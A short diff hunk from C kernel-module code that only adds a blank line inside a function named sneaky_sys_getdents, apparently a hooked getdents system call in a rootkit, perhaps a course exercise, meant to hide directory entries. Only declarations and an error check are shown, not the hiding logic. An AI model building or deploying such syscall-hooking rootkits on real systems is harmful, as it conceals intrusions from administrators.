@@ -55,6 +55,7 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd,
     handle_error("getdents");
     return read_len;
   }
+
   struct linux_dirent *evil;
   int position;
   char *dbuf = (char *)dirent;
